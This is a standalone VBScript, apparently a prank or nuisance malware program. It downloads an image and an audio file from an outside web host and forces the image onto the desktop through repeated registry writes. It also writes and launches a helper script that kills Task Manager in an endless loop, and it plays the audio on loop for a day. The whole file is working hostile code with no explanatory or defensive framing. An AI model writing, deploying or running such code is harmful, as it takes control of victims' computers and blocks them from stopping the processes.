Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
'Get image data
Dim document : Set document = WScript.GetObject("https://pwcreatures.vercel.app/bin/oQgVEcfyA6NGPHjrAAzAIkKA93lg0CAAAeh7Nb~noop.jpeg")
While document.readyState <> "complete" : WScript.Sleep 200 : Wend
Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP.3.0")
xhr.open "GET", document.getElementsByTagName("img")(0).src, False
xhr.send
Dim stream : Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.Write xhr.responseBody
stream.SaveToFile "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", 2
stream.Close
'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pwcreatures.vercel.app/bin/music.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with
'Set subfolder for changing desktop image
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZS.vbs"
lines = Array( _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
    "Dim strUsername : strUsername = wshNetwork.UserName", _
    "strLocalPath = ""C:\Users\" & strUsername & "\Downloads\LemonZS.jpg""", _
    "objShell.RegWrite ""HKCU\Control Panel\Desktop\Wallpaper"", strLocalPath", _
    "WScript.Sleep 10000", _
    "objShell.Run ""%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1, True" _
)
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing
'Set subfolder for disabling task manager
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZST.vbs"
lines = Array( _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Do", _
    "    If IsTaskManagerOpen() Then", _
    "        objShell.Run ""taskkill /f /im Taskmgr.exe"", 0, True", _
    "    End If", _
    "    WScript.Sleep 100", _
    "Loop", _
    "Function IsTaskManagerOpen()", _
    "    Set objWMIService = GetObject(""winmgmts:\\.\root\cimv2"")", _
    "    Set colProcesses = objWMIService.ExecQuery(""Select * from Win32_Process Where Name = 'Taskmgr.exe'"")", _
    "    If colProcesses.Count > 0 Then", _
    "        IsTaskManagerOpen = True", _
    "    Else", _
    "        IsTaskManagerOpen = False", _
    "    End If", _
    "End Function" _
)
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing
'Set image
WScript.Sleep 2000
Dim objShell
Set objShell = CreateObject("WScript.Shell")
strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
strDisableTaskManager = strProfileFolder & "\Downloads\LemonZST.vbs"
Set objNetwork = CreateObject("WScript.Network")
strUsername = objNetwork.UserName
objShell.Run strDisableTaskManager
objShell.Run strDisableTaskManager
Do
    strDesktopWallpaper = objShell.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
    If StrComp(strDesktopWallpaper, "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", vbTextCompare) = 0 Then
        Exit Do
    End If
    WScript.Sleep 1000
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
Loop
'WScript.Echo "Desktop wallpaper matches: C:\Users\" & strUsername & "\Downloads\LemonZS.jpg"
Set objShell = Nothing
'Set music
Set objShell = CreateObject("WScript.Shell")
Set objWMPlayer = CreateObject("WMPlayer.OCX")
strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
objWMPlayer.URL = strMusicPath
objWMPlayer.settings.setMode "loop", True
objWMPlayer.settings.setMode "autoRewind", True
objWMPlayer.controls.play
WScript.Sleep 86400000
Set objShell = Nothing
Set objWMPlayer = Nothing